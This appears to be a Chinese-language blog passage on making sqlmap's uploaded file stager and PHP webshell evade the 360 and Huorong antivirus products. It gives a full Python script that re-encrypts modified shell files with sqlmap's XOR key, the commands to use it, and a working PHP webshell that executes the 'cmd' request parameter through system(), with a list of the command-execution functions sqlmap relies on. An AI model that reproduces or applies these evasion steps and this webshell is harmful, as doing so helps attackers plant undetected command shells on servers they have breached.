杀软绕过

根据上面的原理分析，sqlmap会上传两个文件，一个用于文件上传一个用于执行命令

第一个文件上传源码在data\shell\stagers

第二个文件上传的webshell马在data\shell\backdoors

这两个文件默认都会被杀软标记的。所以把他解密后修改再加密回去

python3 cloak.py -d -i D:\sqlmap\data\shell\backdoors\backdoor.php_

sqlmap如果上传不成功会问do you want to try the same method used for the file stager?就是以sql注入的方式直接写进去不用文件上传的那条路，所以这里可以只免杀第二个PHP也可以两个都免杀用文件上传的方式。

这样360和火绒都不会再查杀，然后要还原回去。使用下面这个脚本

#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
test.py - 文件加密/解密工具
基于 cloak.py 的简化版本
"""

import os
import struct
import sys
import zlib

# 加密密钥
KEY = b"E6wRbVhD0IBeCiGJ"


def xor(message, key):
    """XOR 加密/解密函数"""
    return b"".join(struct.pack('B', message[i] ^ key[i % len(key)]) for i in range(len(message)))


def cloak(input_file, output_file=None):
    """
    加密文件

    参数:
        input_file: 要加密的输入文件路径
        output_file: 加密后的输出文件路径 (可选，默认为输入文件加 '_encrypted')
    """
    if not os.path.isfile(input_file):
        print(f"错误: 文件 '{input_file}' 不存在")
        return False

    # 读取原始文件
    with open(input_file, "rb") as f:
        data = f.read()

    # 加密: 压缩 + XOR
    encrypted_data = xor(zlib.compress(data), KEY)

    # 确定输出文件名
    if output_file is None:
        output_file = input_file + '_encrypted'

    # 写入加密文件
    with open(output_file, "wb") as f:
        f.write(encrypted_data)

    print(f"文件已加密: {input_file} -> {output_file}")
    return True


def decloak(input_file, output_file=None):
    """
    解密文件

    参数:
        input_file: 要解密的输入文件路径
        output_file: 解密后的输出文件路径 (可选，默认为输入文件去掉 '_encrypted')
    """
    if not os.path.isfile(input_file):
        print(f"错误: 文件 '{input_file}' 不存在")
        return False

    # 读取加密文件
    with open(input_file, "rb") as f:
        encrypted_data = f.read()

    try:
        # 解密: XOR + 解压缩
        decrypted_data = zlib.decompress(xor(encrypted_data, KEY))
    except Exception as e:
        print(f"错误: 文件解密失败 - {e}")
        print("请确认输入文件是有效的加密文件")
        return False

    # 确定输出文件名
    if output_file is None:
        # 尝试自动生成解密文件名
        if input_file.endswith('_encrypted'):
            output_file = input_file[:-10]  # 去掉 '_encrypted'
        else:
            output_file = input_file + '_decrypted'

    # 写入解密文件
    with open(output_file, "wb") as f:
        f.write(decrypted_data)

    print(f"文件已解密: {input_file} -> {output_file}")
    return True


def main():
    """主函数 - 处理命令行参数"""
    if len(sys.argv) < 3:
        print("文件加密/解密工具")
        print("用法:")
        print("  加密: python test.py encrypt <输入文件> [输出文件]")
        print("  解密: python test.py decrypt <输入文件> [输出文件]")
        print("")
        print("示例:")
        print("  python test.py encrypt secret.txt")
        print("  python test.py decrypt secret.txt_encrypted")
        print("  python test.py encrypt data.doc encrypted_data.bin")
        return

    command = sys.argv[1].lower()
    input_file = sys.argv[2]
    output_file = sys.argv[3] if len(sys.argv) > 3 else None

    if command == "encrypt":
        cloak(input_file, output_file)
    elif command == "decrypt":
        decloak(input_file, output_file)
    else:
        print(f"错误: 未知命令 '{command}'")
        print("请使用 'encrypt' 或 'decrypt'")


if __name__ == "__main__":
    main()

使用：

python3 test.py encrypt stager.php

然后保存到data\shell\stagers下然后重命名为stager.php_即可。

第二个PHP

第二个PHP试了下国内常见的360和火绒都没有杀，不过还是可以稍微免杀一下，杀软的webshell查杀比较好过。主要的就是这几行代码

<?php 
$c = $_REQUEST["cmd"];
ob_start();
system($c);
$w = ob_get_clean();
echo "<pre>$w</pre>"; ?>

必须要有echo返回内容回去sqlmap才能接收到。其他的就任意修改即可。sqlmap默认的的PHP使用的是以下这几个函数。

system
proc_open
shell_exec
passthru
